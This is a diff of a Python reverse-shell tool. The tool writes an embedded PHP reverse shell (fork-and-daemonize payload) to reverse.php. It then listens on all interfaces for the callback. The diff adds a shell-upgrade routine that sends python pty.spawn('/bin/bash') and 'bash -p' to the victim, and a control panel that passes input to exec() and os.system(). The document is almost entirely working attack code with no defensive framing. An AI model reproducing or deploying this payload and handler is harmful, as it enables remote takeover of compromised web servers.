@@ -75,12 +75,12 @@ $debug = 0;
 if (function_exists('pcntl_fork')) {
 	// Fork and have the parent process exit
 	$pid = pcntl_fork();
-	
+
 	if ($pid == -1) {
 		printit("ERROR: Can't fork");
 		exit(1);
 	}
-	
+
 	if ($pid) {
 		exit(0);  // Parent exits
 	}
@@ -197,7 +197,7 @@ function printit ($string) {
 	}
 }
 
-?> 
+?>
 
 
 '''
@@ -206,41 +206,101 @@ function printit ($string) {
 with open("reverse.php","w") as file:
 	file.write(reversephp)
 
-
-
+def tty():
+	global shell
+	global command_pannel
+	temp_shell = shell
+	print("Invoking tty")
+	client_socket.send(("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"+"\n").encode())
+	while True:
+		results = client_socket.recv(buffer).decode()
+		if shell in results:
+			break
+	if results != temp_shell:
+		client_socket.send(("python -c 'import pty;pty.spawn(\"/bin/bash\")'"+"\n").encode())
+		while True:
+			results = client_socket.recv(buffer).decode()
+			if shell in results:
+				break
+	if results != temp_shell:
+		client_socket.send(("bash -p"+"\n").encode())
+		while True:
+			results = client_socket.recv(buffer).decode()
+			if shell in results:
+				break
+	if results == temp_shell:
+		print("Failed")
+	else:
+		print("success")
+		shell = results
+		command_pannel = False
 def start_listener(port):
+	global client_socket
+	global buffer
+	global shell
+	global command_pannel
+
 	host = "0.0.0.0"
 	port = port
-
 	buffer = 1024
-
 	s = socket.socket()
 
 	s.bind((host, port))
 	s.listen(5)
 	print(f"Listening at {host}:{port} ...")
-
 	client_socket, client_address = s.accept()
 	print(f"{client_address[0]} on port : {client_address[1]}                    [+]Connected")
 
 	results = "a"
 	shell = client_socket.recv(buffer).decode()
+	command_pannel = True
+
+	disponible_commands = ["\n-> Exploitation:","shell  : Invoke shell","\n-> Interface:","exit  : kill the reverse shell","other  : Display specific commands", "\n-> Inside Rev Shell Commands:","#help  : Display help message"]
+	other_commands = {"tty":"Invoke tty"}
+	shell_commands = ["#help  : Display this message","#kill  : Exit the reverse shell and the program", "#exit  : Return to command panel"]
+
+
 	while True:
-		liste = []
-		command = input(shell)
-		client_socket.send((command+"\n").encode())
-		if command.lower() == "exit-py":
-			break
-		while True:
-			results = client_socket.recv(buffer).decode()
-			for i in results.split("\n"):
-				if i!=command:
-					liste.append(i)
-			if shell in results:
+		if command_pannel == False:
+			liste = []
+			command = input(shell)
+			client_socket.send((command+"\n").encode())
+			if command.lower() == "#kill":
+				client_socket.send(("exit"+"\n").encode())
 				break
-		while "" in liste:
-			liste.remove("")
-		print("\n".join(liste[:-1]))
+			elif command.lower() == "#exit":
+				command_pannel = True
+			elif command.lower() == "#help":
+				for i in shell_commands:
+					print(i)
+			elif command.lower() == "exit":
+				break
+			while True:
+				results = client_socket.recv(buffer).decode()
+				for i in results.split("\n"):
+					if i!=command:
+						liste.append(i)
+				if shell in results:
+					break
+			while "" in liste:
+				liste.remove("")
+			print("\n".join(liste[:-1]))
+		elif command_pannel == True:
+			command = input(">>")
+			if command == "help":
+				for i in disponible_commands:
+					print(f"{i}")
+			elif command == "shell":
+				command_pannel = False
+			elif command == "exit":
+				break
+			elif command == "other":
+				for i in other_commands.keys():
+					print(i)
+			elif command in other_commands:
+				exec(command+f"()")
+			elif command not in other_commands:
+				os.system(command)
 	client_socket.close()
 
 	s.close()
